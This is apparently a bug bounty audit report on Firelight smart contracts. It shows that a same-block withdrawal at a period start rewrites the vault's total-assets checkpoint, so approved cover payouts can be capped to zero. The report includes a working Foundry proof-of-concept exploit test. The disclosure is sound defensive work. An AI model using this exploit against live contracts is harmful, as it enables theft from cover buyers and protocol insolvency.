# 89122 sc high same block period start withdrawal can lower the payout exposure cap after cover capacity is committed

**Submitted on Aug 17th 2026 at 10:49:29 UTC by @abarbatei for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89122
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

At the start of a cover period, committed cover capacity is computed from the vault's period-start active assets. A staker can withdraw or redeem after that capacity commit in the same block when the block timestamp equals the period start, causing the vault to overwrite the same period-start total-assets checkpoint with a lower value. Later incident payouts for the same period re-read that lower checkpoint as the payout exposure cap, so cover can be settled against assets that are no longer charged for the approved vault-leg payout.

## Vulnerability Details

Normal behavior is that the same period-start vault exposure should govern both cover capacity and the later vault payout cap. Capacity can be committed once for the current period, settlement then uses the stored commitment, and an approved payout is capped by the assets exposed at the incident capture period start.

The root cause is that the vault does not freeze the total-assets checkpoint once another contract has consumed it as a period-start economic snapshot. The capacity helper reads the vault's current period-start total assets while validating the matching capacity:

[`CoverOrderAllocator::_computeAvailableCapacity` lines 710-716](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L710-L716)

```solidity
        uint256 totalAssetsCanonical = Decimals.convert(
            $.vault.totalAssetsAt($.vault.currentPeriodStart()),
            $.vaultAssetDecimals,
            CANONICAL_DECIMALS,
            Math.Rounding.Floor
        );
        uint256 stakedAssetsValueUSDCanonical = totalAssetsCanonical.mulDiv(assetPriceUSD, 10 ** $.priceFeedDecimals);
```

The capacity value is then stored in the period commitment and is not tied to a frozen vault snapshot:

[`CoverOrderAllocator::commitAllocation` lines 348-356](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L348-L356)

```solidity
        _validateMatchingCapacity($, currentPeriod, matchingCapacity, totalAllocated);

        AllocationCommitment storage commit = $.allocationCommitments[currentPeriod];
        commit.root = merkleRoot;
        commit.totalAvailableCapacity = matchingCapacity;
        commit.totalDeclaredAllocated = totalAllocated;
        commit.graceExpiresAt = graceExpiresAt;

        emit AllocationCommitted(currentPeriod, merkleRoot, matchingCapacity, totalAllocated);
```

A later withdrawal request in the same block burns shares, assigns the assets to a future withdrawal period, and records them as pending withdrawal assets:

[`FirelightVault::_requestWithdraw` lines 1008-1019](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1008-L1019)

```solidity
        uint256 period = currentPeriod() + 1;
        uint256 sharesWithdraw = _convertToSharesTotals(
            assets,
            withdrawShares[period],
            withdrawAssets[period],
            Math.Rounding.Floor
        );
        withdrawAssets[period] += assets;
        withdrawShares[period] += sharesWithdraw;
        withdrawSharesOf[period][receiver] += sharesWithdraw;

        pendingWithdrawAssets += assets;
```

Both [`FirelightVault::redeem` lines 733-742](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L733-L742) and [`FirelightVault::withdraw` lines 771-775](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L771-L775) then call the same trace logger with the reduced total active assets. The trace key is the current block timestamp:

[`FirelightVault::_logTrace`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1056)

```solidity
    function _logTrace(
        address owner,
        uint256 balance,
        uint256 _totalSupply,
        uint256 _totalAssets,
        bool isLogAssets
    ) private {
        uint48 ts = Time.timestamp();
        _traceBalanceOf[owner].push(ts, balance);
        _traceTotalSupply.push(ts, _totalSupply);

        if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
    }
```

The checkpoint library overwrites the last stored value when the new key equals the last key, and historical reads return the latest checkpoint at or before the queried key:

[`Checkpoints::push` lines 203-212](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L203-L212)

```solidity
        (bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();

        uint256 len = self._values.length;
        uint256 lastValue = latest(self);
        if (exists && key == lastKey) {
            self._values[len - 1] = value;
        } else {
            self._trace.push(key, uint208(len));
            self._values.push(value);
        }
```

[`Checkpoints::upperLookupRecent`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L221-L223)

```solidity
    function upperLookupRecent(Trace256 storage self, uint48 key) internal view returns (uint256) {
        uint208 idx = self._trace.upperLookupRecent(key);
        return idx > 0 ? self._values[idx] : 0;
```

This makes the attack path possible:

{% stepper %}
{% step %}

## A period begins at timestamp `T`.

{% endstep %}

{% step %}

## Capacity is committed

The allocator commits capacity for that period before the attacker in the same block. The committed capacity includes the attacker's active vault assets because the period-start read still includes them.
{% endstep %}

{% step %}

## The attacker requests a withdrawal or redemption

The attacker calls [`FirelightVault::withdraw` lines 771-775](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L771-L775) or [`FirelightVault::redeem` lines 733-742](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L733-L742) later in the same block. The vault writes a lower total-assets trace value at key `T`.
{% endstep %}

{% step %}

## Cover orders settle against the stored commitment

Settlement reads the stored committed capacity rather than recomputing the vault period-start checkpoint:

[`CoverOrderAllocator::_settleCoverOrder` lines 500-510](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L500-L510)

```solidity
            // Per-protocolConcentration cap: protocolConcentrationBps * totalAvailableCapacity / BPS
            // The cap comes from the checkpoint active at order.period.
            Market storage mStored = $.supportedMarkets[marketCoverAllocations[i].marketId];
            bytes32 concHash = _getProtocolConcentrationHash(mStored.chainId, mStored.protocol);
            uint256 newProtocolConcentrationCover =
                $.protocolConcentrationSettledCover[order.period][concHash] + mCover;
            uint256 protocolConcentrationCap =
                (_getEffectiveProtocolConcentration(concHash, order.period) * commit.totalAvailableCapacity) /
                    BPS_DENOMINATOR;
            if (newProtocolConcentrationCover > protocolConcentrationCap)
                revert ProtocolConcentrationOverflow(newProtocolConcentrationCover, protocolConcentrationCap);
```

{% endstep %}

{% step %}

## An approved incident re-reads the rewritten checkpoint

If a legitimate incident for that period is later approved, the payout path re-reads the capture-period start asset checkpoint and uses it as the cap, even though the pending withdrawal pools are still counted as payable assets:

[`FirelightVault::payout` lines 900-927](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L900-L927)

```solidity
        (uint256 capturePeriod, uint48 capturePeriodStart) = _periodAndStartAt(captureTimestamp);
        uint256 _currentPeriod = currentPeriod();

        // Payout can execute during the incident period or the following period.
        // After that, withdrawals for the incident period can become claimable.
        if (!_isPeriodInPayoutWindow(capturePeriod, _currentPeriod)) {
            revert InvalidCapturePeriod();
        }

        // Cap by the active assets committed at the start of the covered period.
        // This is an exposure cap, not a segregated asset bucket.
        uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
        uint256 currentActiveAssets = totalAssets();

        // Withdrawals requested during the capture period are assigned to capturePeriod + 1
        // and remain payable while payout is allowed.
        uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];

        // If payout happens in the following period, withdrawals requested before payout
        // during that following period are assigned to capturePeriod + 2 and should also
        // remain payable; otherwise exposed assets could escape by withdrawing first.
        uint256 nextPeriodWithdrawals;
        if (_currentPeriod == capturePeriod + 1) {
            nextPeriodWithdrawals = withdrawAssets[capturePeriod + 2];
        }

        uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
        paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

{% endstep %}
{% endstepper %}

The important detail is that the withdrawal pool is present in the payable-assets calculation. The underpayment comes from the rewritten period-start cap. If period-start active assets were `A` and the attacker withdrew `W` after the capacity commit in the same timestamp, future vault-leg payout capacity for that period can be reduced from `A` to `A - W`. In the extreme case where `W == A`, the vault-leg payout can be capped to zero while cover was settled against those same vault assets and the attacker's delayed withdrawal remains claimable after the payout window.

Required preconditions are narrow but attacker-reachable. The attacker is an untrusted staker with vault shares and can submit a withdrawal or redemption transaction. A block timestamp must equal the vault period start, and the allocator's honest capacity commit must execute earlier in that same block. The allocator, settlement, and incident roles do not need to act maliciously; they only need to perform the documented matching, settlement, and legitimate payout lifecycle.

## Impact Details

The impact is protocol insolvency. Settled cover can be accepted using a period-start capacity snapshot that includes the attacker's assets, but a later approved vault payout for that same cover period can be capped by a rewritten lower snapshot that excludes those assets. The protocol can therefore owe an approved cover payout that the vault path refuses to pay, while the attacker can later claim the delayed withdrawal that backed the committed cover capacity.

The maximum shortfall is bounded by the amount of same-timestamp active assets withdrawn after the capacity commit and by the approved vault-leg payout amount. This is not merely a temporary withdrawal delay or a trusted-role configuration issue: the mismatch is created by an untrusted staker action that changes a historical exposure checkpoint after another in-scope contract already relied on it.

## Mitigation

Use one immutable per-period exposure snapshot for both capacity and payout. For example, store `periodStartTotalAssets[period]` when a period is first used for capacity, reject later changes to that value, and have both capacity validation and vault payout read that stored per-period value.

Alternatively, prevent the total-assets trace from overwriting an existing checkpoint at a period boundary once that boundary can be consumed as an economic snapshot. A same-timestamp withdrawal should not be able to change the value returned for a period-start timestamp that capacity validation may already have read.

## References

* [`CoverOrderAllocator::commitAllocation`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L332-L357): validates and stores the current-period capacity commitment.
* [`CoverOrderAllocator::_computeAvailableCapacity`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L696-L725): computes staked capacity from the vault's current period-start total assets.
* [`FirelightVault::withdraw` lines 771-775](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L771-L775) and [`FirelightVault::redeem` lines 733-742](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L733-L742): write the reduced total-assets trace after requesting withdrawal.
* [`FirelightVault::_requestWithdraw` lines 1008-1019](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1008-L1019): moves withdrawn assets into the next withdrawal period and records the pending withdrawal amount.
* [`FirelightVault::_logTrace`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1056): stores total-assets checkpoints at the current timestamp.
* [`Checkpoints::push` lines 203-212](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L203-L212): overwrites the existing value when the checkpoint key is unchanged.
* [`FirelightVault::payout` lines 900-927](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L900-L927): re-reads the capture-period start assets and uses that value as the vault-leg payout cap.

## Proof of Concept

### Setup assumptions

Place the proof file at `test/poc/boundary-withdrawal-rewrites-period-start-exposure/ProofBoundaryWithdrawalRewritesPeriodStartExposure.t.sol` in the target repository. It deploys the in-scope `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager` implementations through ERC1967 proxies, using the target contracts and target OpenZeppelin imports. No target source file needs to be edited.

The proof uses the pinned commit [42f9ea5e43d88b35197b901acc2a8c24b314fa62](https://github.com/immunefi-team/audit-comp-firelight/commit/42f9ea5e43d88b35197b901acc2a8c24b314fa62). The test constructs a one-day vault period, creates a next-period cover order, commits allocation capacity at the exact period-start timestamp, has the staker withdraw in the same timestamp, settles the order against the stored commitment, approves an incident assessment, and then asserts that the vault leg pays zero while the staker can later claim the delayed withdrawal.

### Execution command

```bash
forge test --contracts test/poc/boundary-withdrawal-rewrites-period-start-exposure --use solc-0.8.28 --offline --via-ir --optimize --optimizer-runs 800 --remappings @openzeppelin/contracts/=node_modules/@openzeppelin/contracts/ --remappings @openzeppelin/contracts-upgradeable/=node_modules/@openzeppelin/contracts-upgradeable/ --match-contract ProofBoundaryWithdrawalRewritesPeriodStartExposure -vv
```

### Execution result

Forge compiled 66 files with Solidity 0.8.28, ran the single proof test, and reported `1 passed; 0 failed; 0 skipped`.

### Proof source

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {MockERC20} from "../../../contracts/test/MockERC20.sol";
import {MockAggregatorV3} from "../../../contracts/test/MockAggregatorV3.sol";
import {FirelightVault} from "../../../contracts/core/FirelightVault.sol";
import {CoverNFT} from "../../../contracts/core/CoverNFT.sol";
import {CoverOrderAllocator} from "../../../contracts/core/CoverOrderAllocator.sol";
import {IncidentManager} from "../../../contracts/core/IncidentManager.sol";
import {IFirelightVault} from "../../../contracts/core/interfaces/IFirelightVault.sol";
import {ICoverOrderAllocator} from "../../../contracts/core/interfaces/ICoverOrderAllocator.sol";
import {IIncidentManager} from "../../../contracts/core/interfaces/IIncidentManager.sol";
import {IAggregatorV3} from "../../../contracts/core/interfaces/IAggregatorV3.sol";

interface Vm {
    function prank(address msgSender) external;
    function warp(uint256 newTimestamp) external;
}

contract ProofBoundaryWithdrawalRewritesPeriodStartExposure {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    uint48 private constant START_TIME = 1_700_000_000;
    uint48 private constant PERIOD_DURATION = 1 days;
    uint48 private constant MAX_PRICE_AGE = 30 days;

    uint256 private constant STAKE_ASSETS = 1_000_000_000; // 1,000 units with 6 decimals.
    uint256 private constant COVER_CANONICAL = 1_000 ether;

    address private constant STAKER = address(0xA11CE);
    address private constant BUYER = address(0xB0B);
    address private constant CURATOR = address(0xC012A70);
    address private constant ALLOCATOR = address(0xA110CA70);
    address private constant APPROVER = address(0xA77B0);
    address private constant REJECTER = address(0xBADC0DE);
    address private constant INVALIDATOR = address(0x1A1D);
    address private constant FIRST_LOSS_BUFFER = address(0xF1B);
    address private constant PREMIUM_COLLECTOR = address(0xC011EC70);
    address private constant PAYOUT_RECEIVER = address(0xCAFE);

    error AssertionFailed(string label, uint256 actual, uint256 expected);
    error AddressAssertionFailed(string label, address actual, address expected);

    struct Env {
        MockERC20 asset;
        MockAggregatorV3 priceFeed;
        FirelightVault vault;
        CoverNFT coverNFT;
        CoverOrderAllocator allocator;
        IncidentManager incidentManager;
        bytes32 marketId;
    }

    function testBoundaryWithdrawalRewritesPayoutExposureCap() external {
        Env memory env = _deploySystem();

        _depositStakerAssets(env);
        uint256 orderId = _createNextPeriodCoverOrder(env);

        uint48 periodStart = uint48(START_TIME + PERIOD_DURATION);
        vm.warp(periodStart);

        uint256 coveredPeriod = env.vault.currentPeriod();
        _assertEq(coveredPeriod, 1, "covered period");
        _assertEq(env.vault.totalAssetsAt(periodStart), STAKE_ASSETS, "period-start assets before commit");

        ICoverOrderAllocator.MarketCoverAllocation[] memory settlement = _singleMarketSettlement(env.marketId);
        bytes32 root = _singleLeafRoot(orderId, settlement);

        vm.prank(ALLOCATOR);
        env.allocator.commitAllocation(coveredPeriod, root, COVER_CANONICAL, COVER_CANONICAL);
        _assertEq(
            env.allocator.getAllocationCommitment(coveredPeriod).totalAvailableCapacity,
            COVER_CANONICAL,
            "capacity committed from original checkpoint"
        );

        vm.prank(STAKER);
        env.vault.withdraw(STAKE_ASSETS, STAKER, STAKER);
        _assertEq(env.vault.totalAssetsAt(periodStart), 0, "rewritten period-start assets");

        bytes32[] memory proof = new bytes32[](0);
        vm.prank(ALLOCATOR);
        env.allocator.settleCoverOrder(orderId, settlement, proof);

        ICoverOrderAllocator.CoverOrder memory order = env.allocator.getCoverOrder(orderId);
        _assertEq(uint256(order.status), uint256(ICoverOrderAllocator.CoverOrderStatus.MATCHED), "settled order status");
        _assertEq(order.allocatedCoverAmount, COVER_CANONICAL, "settled cover amount");
        _assertAddressEq(env.coverNFT.ownerOf(orderId), BUYER, "cover nft owner");

        env.incidentManager = _deployIncidentManager(env);
        uint256 incidentId = _approveAssessment(env, orderId, periodStart);

        (IIncidentManager.Incident memory incident, bool exists) = env.incidentManager.getIncident(incidentId);
        require(exists, "incident exists");
        _assertEq(uint256(incident.status), uint256(IIncidentManager.IncidentStatus.CLOSED), "incident closed");
        _assertEq(incident.vaultPaidAmount, 0, "approved vault leg paid zero");
        _assertEq(env.asset.balanceOf(PAYOUT_RECEIVER), 0, "payout receiver balance");

        uint256 withdrawPeriod = coveredPeriod + 1;
        _assertEq(env.vault.withdrawalsOf(withdrawPeriod, STAKER), STAKE_ASSETS, "withdrawal remains payable");

        vm.warp(uint256(periodStart) + 2 * PERIOD_DURATION + 1);
        vm.prank(STAKER);
        uint256 claimed = env.vault.claimWithdraw(withdrawPeriod);

        _assertEq(claimed, STAKE_ASSETS, "attacker claimed escaped backing assets");
        _assertEq(env.asset.balanceOf(STAKER), STAKE_ASSETS, "attacker final asset balance");
    }

    function _deploySystem() private returns (Env memory env) {
        vm.warp(START_TIME);

        env.asset = new MockERC20("Mock Vault Asset", "mVA", 6);
        env.priceFeed = new MockAggregatorV3(18, int256(1 ether));
        env.vault = _deployVault(env.asset);
        env.coverNFT = _deployCoverNFT();
        (env.allocator, env.marketId) = _deployAllocator(env);
        env.coverNFT.grantRole(env.coverNFT.MINTER_ROLE(), address(env.allocator));
    }

    function _deployVault(MockERC20 asset) private returns (FirelightVault vault) {
        FirelightVault implementation = new FirelightVault();
        FirelightVault.InitParams memory params = FirelightVault.InitParams({
            defaultAdmin: address(this),
            limitUpdater: address(this),
            blocklister: address(this),
            pauser: address(this),
            periodConfigurationUpdater: address(this),
            rescuer: address(this),
            depositLimit: 10_000_000_000_000,
            periodConfigurationDuration: PERIOD_DURATION
        });
        bytes memory data = abi.encodeCall(
            FirelightVault.initialize,
            (IERC20(address(asset)), "Firelight Vault", "FLV", abi.encode(params))
        );
        vault = FirelightVault(address(new ERC1967Proxy(address(implementation), data)));
    }

    function _deployCoverNFT() private returns (CoverNFT coverNFT) {
        CoverNFT implementation = new CoverNFT();
        bytes memory data = abi.encodeCall(
            CoverNFT.initialize,
            ("Firelight Cover", "FLCOVER", "", address(this), address(this), address(0), address(0))
        );
        coverNFT = CoverNFT(address(new ERC1967Proxy(address(implementation), data)));
    }

    function _deployAllocator(Env memory env) private returns (CoverOrderAllocator allocator, bytes32 marketId) {
        string memory protocol = "BoundaryProtocol";
        bytes32 market = bytes32(uint256(1));
        marketId = keccak256(abi.encode(uint64(1), protocol, market));

        address[] memory premiumTokens = new address[](1);
        premiumTokens[0] = address(env.asset);

        ICoverOrderAllocator.ProtocolConcentrationInput[] memory concentrations =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](1);
        concentrations[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 1,
            protocol: protocol,
            maxProtocolConcentrationBps: 10_000
        });

        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](1);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: protocol, market: market});

        ICoverOrderAllocator.InitParams memory params = ICoverOrderAllocator.InitParams({
            vault: IFirelightVault(address(env.vault)),
            premiumCollector: PREMIUM_COLLECTOR,
            coverNFT: env.coverNFT,
            priceFeedAdapter: IAggregatorV3(address(env.priceFeed)),
            maxPriceAge: MAX_PRICE_AGE,
            premiumTokens: premiumTokens,
            admin: address(this),
            adminRole: address(this),
            curatorRole: CURATOR,
            allocatorRole: ALLOCATOR,
            configAdminRole: address(this),
            initialProtocolConcentrations: concentrations,
            newMarkets: markets,
            capacityConfig: ICoverOrderAllocator.CapacityConfig({
                minCAR: 12_000,
                firstLossBufferToken: IERC20(address(env.asset)),
                firstLossBuffer: FIRST_LOSS_BUFFER,
                effectiveLeverage: 12_000,
                minOrderMarketCoverAmount: 1,
                divergenceToleranceBps: 0
            })
        });

        CoverOrderAllocator implementation = new CoverOrderAllocator();
        bytes memory data = abi.encodeWithSelector(CoverOrderAllocator.initialize.selector, params);
        allocator = CoverOrderAllocator(address(new ERC1967Proxy(address(implementation), data)));
    }

    function _deployIncidentManager(Env memory env) private returns (IncidentManager incidentManager) {
        IncidentManager implementation = new IncidentManager();
        bytes memory data = abi.encodeCall(
            IncidentManager.initialize,
            (
                address(this),
                CURATOR,
                APPROVER,
                REJECTER,
                INVALIDATOR,
                address(0),
                address(0),
                address(0),
                PAYOUT_RECEIVER,
                ICoverOrderAllocator(address(env.allocator)),
                IAggregatorV3(address(env.priceFeed)),
                MAX_PRICE_AGE
            )
        );
        incidentManager = IncidentManager(address(new ERC1967Proxy(address(implementation), data)));

        env.vault.grantRole(env.vault.INCIDENT_ROLE(), address(incidentManager));
        env.vault.grantRole(env.vault.PAYOUT_ROLE(), address(incidentManager));
        env.vault.grantRole(env.vault.PAYOUT_ALLOWLIST_ROLE(), address(this));
        env.vault.addToPayoutAllowlist(PAYOUT_RECEIVER);
    }

    function _depositStakerAssets(Env memory env) private {
        env.asset.mint(STAKER, STAKE_ASSETS);
        vm.prank(STAKER);
        env.asset.approve(address(env.vault), STAKE_ASSETS);
        vm.prank(STAKER);
        env.vault.deposit(STAKE_ASSETS, STAKER);
    }

    function _createNextPeriodCoverOrder(Env memory env) private returns (uint256 orderId) {
        env.asset.mint(BUYER, 100_000_000);
        vm.prank(BUYER);
        env.asset.approve(address(env.allocator), type(uint256).max);

        ICoverOrderAllocator.MarketAllocationInput[] memory markets =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        markets[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: env.marketId,
            coverRateAnnual: 36_500,
            coverAmount: COVER_CANONICAL
        });

        vm.prank(CURATOR);
        orderId = env.allocator.createCoverOrder(
            BUYER,
            BUYER,
            "beneficiary",
            address(env.asset),
            markets,
            ICoverOrderAllocator.CoverOrderType.NEW
        );
    }

    function _approveAssessment(Env memory env, uint256 orderId, uint48 captureTimestamp) private returns (uint256) {
        vm.prank(CURATOR);
        uint256 incidentId = env.incidentManager.createIncident(
            captureTimestamp,
            "covered boundary incident",
            keccak256("covered-boundary-incident")
        );

        vm.prank(CURATOR);
        env.incidentManager.confirmIncident(incidentId, "ipfs://covered-boundary-incident");

        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] =
            IIncidentManager.AssessmentLoss({coverTokenId: orderId, marketId: env.marketId, amount: COVER_CANONICAL});

        vm.prank(CURATOR);
        env.incidentManager.addAssessmentLosses(incidentId, losses);

        vm.prank(CURATOR);
        env.incidentManager.submitCurrentAssessment(incidentId);

        vm.prank(APPROVER);
        env.incidentManager.approveCurrentAssessment(incidentId);

        return incidentId;
    }

    function _singleMarketSettlement(
        bytes32 marketId
    ) private pure returns (ICoverOrderAllocator.MarketCoverAllocation[] memory settlement) {
        settlement = new ICoverOrderAllocator.MarketCoverAllocation[](1);
        settlement[0] =
            ICoverOrderAllocator.MarketCoverAllocation({marketId: marketId, allocatedCover: COVER_CANONICAL});
    }

    function _singleLeafRoot(
        uint256 orderId,
        ICoverOrderAllocator.MarketCoverAllocation[] memory settlement
    ) private pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(orderId, settlement))));
    }

    function _assertEq(uint256 actual, uint256 expected, string memory label) private pure {
        if (actual != expected) revert AssertionFailed(label, actual, expected);
    }

    function _assertAddressEq(address actual, address expected, string memory label) private pure {
        if (actual != expected) revert AddressAssertionFailed(label, actual, expected);
    }
}
```

### Final impact assertions

The passing proof's final assertions check the accepted impact directly:

* The allocator stores `1,000e18` canonical USD of committed capacity from the original period-start checkpoint.
* The same-timestamp staker withdrawal rewrites `totalAssetsAt(periodStart)` to zero.
* The cover order still settles as `MATCHED` for `1,000e18` canonical USD against the stored commitment.
* The approved incident closes with `vaultPaidAmount == 0` and the payout receiver gets zero vault assets.
* The staker's withdrawal for the covered period remains payable and is claimable after the payout window, returning the assets that backed the settled cover capacity.
